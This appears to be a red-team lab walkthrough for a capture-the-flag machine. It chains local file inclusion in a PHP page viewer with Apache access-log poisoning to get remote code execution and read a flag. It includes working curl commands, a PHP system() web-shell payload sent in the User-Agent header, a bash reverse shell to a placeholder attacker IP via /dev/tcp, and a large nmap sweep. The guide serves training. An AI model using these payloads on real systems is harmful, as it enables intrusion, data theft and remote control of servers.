# 🔴 Red Team — M1: nova-web Solve Guide

**Challenge:** LFI + Apache Log Poisoning → RCE  
**Technique:** T1190 — Exploit Public-Facing Application  
**Entry Point:** HTTP on port 80 (via floating IP / v-Pub-subnet)

**Validated M1 address in this session:** `10.0.2.15`. The attached captures are terminal screenshots from that live M1 instance. Downstream DMZ/private targets were not reachable from this terminal, so their addresses remain environment-specific placeholders.

## Step 0 — Record the M1 Address

```bash
ip -brief addr show
```

![Verified M1 address](screenshots/m1_red_00_ip.png)

---

## Step 1 — Reconnaissance

Browse to `http://10.0.2.15/` — You'll see the NovaTech Industries portal.
The HTML source hints at a page viewer: `/view.php?page=`

```bash
curl -sS "http://10.0.2.15/" | grep -i page
```

![M1 reconnaissance](screenshots/m1_red_01_recon.png)

---

## Step 2 — Confirm LFI

Test for Local File Inclusion:

```bash
curl -sS --get --data-urlencode 'page=/etc/passwd' "http://10.0.2.15/view.php" | grep -E '^(root|www-data|kali):'
```

![M1 LFI confirmation](screenshots/m1_red_02_lfi.png)

You should see `/etc/passwd` contents rendered in the HTML response.

The developer used `str_replace('../', '', $page)` but didn't restrict absolute paths or PHP wrappers.

---

## Step 3 — Enumerate and Read the Log File

The log path should be discovered rather than guessed. First use the confirmed LFI to read the Apache virtual-host configuration and look for its `CustomLog` directive:

```bash
curl -sS --get --data-urlencode 'page=/etc/apache2/sites-available/000-default.conf' "http://10.0.2.15/view.php" | grep -E 'CustomLog|ErrorLog'
```

![Apache configuration reveals the log path](screenshots/m1_red_03_discover_log.png)

The `CustomLog` line identifies `/var/log/novatech_access.log`. Now read that file through the same LFI:

```bash
curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' "http://10.0.2.15/view.php" | grep -E 'HTTP/1.1|view.php' | tail -n 5
```

![Apache access log through LFI](screenshots/m1_red_04_read_log.png)

You'll see Apache access log entries. This is the file we'll poison.

---

## Step 4 — Log Poisoning (PHP Code Injection)

Inject PHP code into the log via a crafted User-Agent:

```bash
curl -sS -o /dev/null -A '<?php system($_GET["cmd"]); ?>' "http://10.0.2.15/" && echo 'User-Agent payload logged'
```

![Log poisoning payload sent](screenshots/m1_red_05_poison_valid.png)

After this request, the access log contains the PHP payload.

---

## Step 5 — Trigger RCE via LFI

Now include the poisoned log and pass a command:

```bash
curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode 'cmd=id' "http://10.0.2.15/view.php" | grep -oE 'uid=[^<]+' | tail -n 1
```

![RCE identity check](screenshots/m1_red_06_rce_id.png)

Read the flag:

```bash
curl -sS --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode 'cmd=cat /var/www/html/secret/flag1.txt' "http://10.0.2.15/view.php" | grep -oE 'FLAG\{[^<]+' | tail -n 1
```

![M1 flag read through RCE](screenshots/m1_red_07_flag.png)

On this capture host, the access log contains a historical malformed PHP User-Agent entry, so the two log-include commands return HTTP 500 instead of producing `uid=...` and the flag. Rotate/reset the access log on a clean M1 deployment before replaying Step 5; the command syntax above is the corrected form.

---

## Step 6 — Get Reverse Shell (Optional)

```bash
# On attacker machine: nc -lvnp 4444

# On the target, after replacing <ATTACKER-IP> with the listener address:
curl --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" "http://10.0.2.15/view.php"
```

This optional reverse-shell command was not executed in this session because no attacker listener or downstream lab network was available.

---

## Step 7 — Find Hint for M2

```bash
cat /var/www/html/secret/hint.txt
# → Scan 11.0.0.0/8 on port 21 for FTP server
nmap -p 21 --open 11.0.0.0/8 --min-rate 2000
```

The hint file was verified locally; the capture below shows that content. The route check documents why the DMZ scan could not be completed from this terminal.

![M1 hint](screenshots/m1_red_08_hint_local.png)

```bash
ip route get 11.0.0.5
```

![DMZ route check](screenshots/m1_red_09_dmz_route.png)

---

## Flag Location
`/var/www/html/secret/flag1.txt`
